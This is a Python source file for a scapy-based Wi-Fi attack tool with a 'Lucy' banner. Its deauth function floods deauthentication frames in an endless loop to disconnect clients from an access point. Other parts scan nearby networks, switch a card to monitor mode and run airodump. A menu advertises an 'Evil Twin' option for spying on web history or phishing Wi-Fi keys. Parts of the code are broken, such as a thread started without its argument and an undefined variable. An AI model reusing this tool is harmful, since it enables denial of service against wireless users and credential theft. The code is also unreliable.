# -*- coding: utf-8 -*-
import os
import time
import pandas as pd
import re
from scapy.all import *
from threading import Thread
from .Dos_Attack.dos_function import *
from .Dos_Attack.dos_function import *
from .Dos_Attack.data_dos.var_dos import *
import json

 
 
def  selectdeauth(t) :
       if t.haslayer(Dot11):
           if  t.addr3 == bssid and t.type == 2 and t.addr2 != bssid and t.addr2.startswith(targetoui):
               trame = RadioTap()/Dot11(type=0,subtype=12,addr1=t.addr2,addr2=bssid,addr3=bssid)/Dot11Deauth(reason=7)
               sendp(trame,iface=interface)

               print("Envoie trame deauth a destination de " + t.addr2)
               
def deauth(ap_mac, gateway_mac, card) :
    
    """Perform Deauth to in client mac through a gateway
        arg : 
            - ap_mac : access point mac
            - gateway : gateway mac adress of access point
            - client_mac : one of client of this access point
            
        return : a stucked packet with RadioTap, Dot11, and Dot11Deauth object
    """
    dot11=Dot11(addr1 = gateway_mac, addr2 = ap_mac, addr3 = ap_mac)
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)
    sendp(packet, inter=0.1, count=None, loop=1, iface=card, verbose=1)
            
    

def airodump_api(netcard) :
    print(netcard)
    os.system(f"sudo {SHELL_FILE} {netcard} airodump")



def write_lucy() :
    print(""" 
 _                     
| |   _   _  ___ _   _ 
| |  | | | |/ __| | | |
| |__| |_| | (__| |_| |
|_____\__,_|\___|\__, |
k2pme            |___/ 
""")

    
def cmd_list(key, card) -> bool:
    arg_data = read_arg()                              # Stats of parameters
    cmd = {"ap" : None, "dst" : None}                                  # Dos attack parameters
    func = {"start" : None, "back" : None, "help" : None, "arg" : None, "clear" : None, "airodump" : None, "del" : None}     # Some line command
    
    md = key[0].rstrip()
    #print(md)
    if  md in cmd :
        try :
            value = key[1].rstrip()
        except IndexError :
            print(f"{md} : {arg_data[md]}")
        else :
            """p = re.compile(r'([0-9a-f]{2}(?::[0-9a-f]{2}){5})', re.IGNORECASE)
            a = re.findall(p, value)
            
            if a == value:"""
            arg_data[md] = value
            print(arg_data)
            write_arg(arg_data)
            del(arg_data)
            
            """elif str(a) == "[]": 
                print("This not a MAC address")"""
    
            #print(arg_data)
        finally:
            return 1
    
    elif key[0].rstrip() in func :
        if key[0] == "back" :
            os.system("clear")
            main()
        elif key[0] == "start" :
            
            for i in arg_data :
                if arg_data[i] is None :
                    return 4 
                else :
                    continue
                
            for i in arg_data :
                print(f"{i} : {arg_data[i]}")
            
            print("Starting ----------")
            print(card)
            
            deauth(arg_data['ap'], arg_data['dst'], card)
            
                
        elif key[0] == "arg" :
            dos_args(arg_data)
                
        elif key[0] == "help" : 
            dos_help()
            return "end" 
        
        elif key[0] == "clear" :
            os.system("clear")
            return "end"
        elif key[0] == "airodump" :
            airodump_api(card)
            return "end" 
        elif key[0] == "del" :
            write_arg(cmd)
            return "end"
        else :
            return 0
    else:
        return 0
    
    

def main() :
    """
        handle the main of the program
        arg : none
        return None
    """
    os.system(f"{PRIVILEGES}")
    
    with open(USER_CHECK) as file :
        w = json.load(file)["user"]
        
    if w != "1" :
        exit(127)
        
        
    else :
        pass
    
    write_lucy()
    
    data = {"1- Dos Attack" : 
        "\n\tSniff and find a MAC adress\n\twhich Dos Attack will be performed through\n",
        "2- DDos Attack" : "\n\tSniff and send deauth trames with 5 thread\n",
        "3- Evil Twin" : "\n\tCreate a evil AP and perform a DDOS or DOS attack \n\tto the target in ordor to push its customers \n\tto connect to your evil AP\n\t\tPosibilities : You can spy web history or get key of W-fi grace to a phishing web page \n"}
    
    for i in data :
        print(i + data[i])
        
    rep = input("~> ")
    
    while int(rep) < 1 or int(rep) > 3 :
        
        print("uncorrect choosing")
        rep = input("~> ")
        
    if rep == "1" :  
        dos()
    
    elif rep == "2" :
        pass
    
    else :
        pass
    

def dos() -> None:   
    """
    
    """
    card = config()
    

    while 1 :
        
        cmd = input("dos>")
        cmd = cmd.split("=")
        per = cmd_list(cmd, card)
        
        if per == 1 :
            pass
        elif per == "end" :
            print("Done !")
        
        elif per == 4 :
            print("Error 200")
        elif per == 0 :
            print("Uncorrect name")
            
        
        



def twala(netcard) -> None:
    """Sniff through a network layer, make sure that this network layer is in monitor mode
        arg : 
            network : network layer
        return none
        """
    
    printer = Thread(target=print_all)
    printer.daemon = True
    printer.start()
    
    sniff(prn = callback, iface=netcard)      # start sniffing on interface layer and has a callback function defined below
    
    
    
    
def config() -> str :
    """This handles turning a choosed layer in monitor mode
        arg : none 
        return : slected layer wrapped with a str object
    """
    os.system(f"{SHELL_FILE} netcard")
    print("Choose and the one of below network card to turn in monitor mode")
    
    with open(CARD_FILE) as file :
        a = json.load(file)            # List all network layers
        
    a.pop("status")
    
    for i in a :
        
        print(f" {i} - {a[i]}")

    n = input("\nChoose your network card : ")


    while int(n) < 1 or int(n) > len(a) :                   # Control loop
        print("Error")
        n = input("\nChoose your network card : ")
        
    netcard = a[str(n)]
    print("Network layer checked \n\n#Configuration#\n")
    
    os.system(f"{SHELL_FILE} {netcard} start")
    
    print("Done !")
        
    return netcard



def callback(packet) :
    
    """Callback fcuntion for sniff method in twala"""
    
    if packet.haslayer(Dot11Beacon) :                   # check if the packet has a Dot11 layer
        # Extract necessary data
        bssid = packet[Dot11].addr2
        ssid = packet[Dot11Elt].info.decode()
        
        try :
            dbm_signal = packet.dBm_AntiSignal
        except :
            dbm_signal = "N/A"
            
        stats = packet[Dot11Beacon].network_stats()
        channel = stats.get("channel")
        
        crypto = stats.get("crypto")
        network.loc[bssid] = (ssid, dbm_signal, channel, crypto)
        
        
        
def print_all(network) -> None :
    """Write frame"""
    while True :
        os.system("clear")
        print(network)
        time.sleep(1)
        
        
        
        
def pandas_config() -> pd.DataFrame :
    """Create a frame for displaying access points"""
    network = pd.DataFrame(columns=["BSSID", "SSID", "dBm_signal", "Channel", "Crypto"])
    network.set_index("BSSID", inplace=True)
    return network